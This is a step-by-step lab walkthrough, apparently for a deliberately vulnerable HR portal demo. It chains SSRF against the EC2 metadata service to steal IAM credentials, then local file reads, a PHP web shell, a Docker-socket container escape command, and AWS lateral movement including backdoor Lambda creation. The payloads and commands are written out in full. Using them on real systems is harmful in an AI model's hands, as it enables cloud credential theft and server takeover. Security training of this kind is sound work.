
# Attack 2: Server-Side Request Forgery (SSRF) to Remote Code Execution (RCE)

SSRF allows attackers to make the server perform HTTP requests to internal resources. This can be escalated to Remote Code Execution in certain scenarios.

## Step 1: Access the Document Upload Page

1. First, log in to the HR Portal (you can use the SQL injection from Attack 1)
2. Navigate to the Document Upload page (`/documents`)

## Step 2: Performing the SSRF Attack

### Basic SSRF Attack

1. Select any file to upload (the content doesn't matter, but having a small text file is helpful)
2. Look for the "Upload Destination" dropdown
3. By default, it will contain `s3://employee-bucket/documents/`
4. Either:
   - Select the "Debug - EC2 Metadata (SSRF)" option from the dropdown
   - OR select "Custom Location" and enter `http://169.254.169.254/latest/meta-data/`
5. Click "Send SSRF Request" (the button text will change when using HTTP URLs)
6. Observe the response displayed in the preview window below the upload form

### Advanced SSRF Attacks

You can try these additional SSRF targets:
- `http://localhost:8080` - Access local services running on the container
- `http://internal-jenkins:8080` - Access internal Jenkins server (if available in the network)
- `file:///etc/passwd` - Read local files on the server (Local File Inclusion)

## Step 3: Extract IAM Credentials

1. Now that you've confirmed the SSRF vulnerability works, let's extract IAM credentials
2. Set the upload URL to: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
3. Click "Send SSRF Request"
4. This will return a list of IAM roles attached to the EC2 instance
5. Note the role name (e.g., `hr-portal-ec2-role`)
6. Change the URL to: `http://169.254.169.254/latest/meta-data/iam/security-credentials/hr-portal-ec2-role`
7. Click "Send SSRF Request" again
8. This will return temporary AWS credentials including:
   - `AccessKeyId`
   - `SecretAccessKey`
   - `Token`
9. Copy these credentials for the next steps

## Step 4: Container Breakout via SSRF

After exploiting SSRF to discover internal network information, you can attempt a container breakout:

1. Select the "Container Environment (Breakout)" option from the dropdown or manually enter `/proc/self/environ`
2. Click "Execute Container Breakout"
3. Review the environment variables displayed, which may include:
   - AWS credentials
   - Container names and IDs
   - System paths and configuration

4. Try other container paths such as:
   - `/proc/1/cgroup` - Shows container information
   - `/etc/hostname` - Shows container hostname
   - `/proc/self/mounts` - Shows mounted filesystems

## Step 5: Upload a Web Shell

After extracting information via SSRF and container breakout, you can upload a web shell:

1. Select "Web Server Root (PHP)" from the dropdown
2. Create a simple PHP file with the following content:
```php
<?php
  if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
  }
?>
```
3. Upload this file with a `.php` extension
4. Click "Upload Web Shell"
5. Note the path where the file is uploaded (typically `/var/www/html/your-file.php`)
6. In a real attack, you would now access this URL: `http://server-ip/your-file.php?cmd=id`
7. This would execute the `id` command on the server and return the output

## Step 6: Complete Container Escape

With a web shell in place, you can attempt a complete container escape:

1. Use the web shell to explore the container file system
2. Look for mounted Docker sockets: `/var/run/docker.sock`
3. If found, you can use this to escape the container:
   ```
   curl -X POST -H "Content-Type: application/json" \
     --unix-socket /var/run/docker.sock \
     -d '{"Image":"alpine","Cmd":["/bin/sh","-c","echo ESCAPED > /tmp/escape.txt"],"HostConfig":{"Binds":["/:/host"]}}' \
     http://localhost/containers/create
   ```
4. This command would create a new container with the host's root directory mounted at `/host`
5. You could then access and modify files on the host system

## Step 7: Lateral Movement in AWS

Using the AWS credentials obtained earlier:

```bash
# Configure AWS CLI with the stolen credentials
export AWS_ACCESS_KEY_ID=ASIA...  # Use the AccessKeyId from Step 3
export AWS_SECRET_ACCESS_KEY=...  # Use the SecretAccessKey from Step 3
export AWS_SESSION_TOKEN=...      # Use the Token from Step 3
export AWS_DEFAULT_REGION=us-east-1  # Adjust region if necessary
```

Then you can:
1. List S3 buckets: `aws s3 ls`
2. List EC2 instances: `aws ec2 describe-instances`
3. Create backdoor Lambda functions (if you have permission)
4. Access other services within the AWS environment

## Troubleshooting SSRF Attacks

If you're not seeing the expected SSRF responses:

1. Make sure you're using the exact URL: `http://169.254.169.254/latest/meta-data/`
2. Try with trailing slash and without
3. Check the browser console for any errors
4. Try different paths like:
   - `http://169.254.169.254/latest/meta-data/ami-id`
   - `http://169.254.169.254/latest/meta-data/hostname`
5. If running in a browser, understand that some requests may fail due to CORS policies
   - In a real attack, the SSRF is executed server-side where CORS doesn't apply
   - You may see simulated responses in our demonstration environment

## Note on Browser CORS Limitations

Because this demonstration runs in a browser, some SSRF attempts may be blocked by the browser's security mechanisms (CORS). In a real server-side vulnerability, these restrictions would not apply because the request would originate from the server, not the browser.

If your SSRF attempt shows a CORS error, this is normal browser behavior. In a real attack scenario:
1. The attacker would exploit a server-side vulnerability
2. The server would make the request (not subject to browser restrictions)
3. The attack would succeed where a browser-based attempt would fail
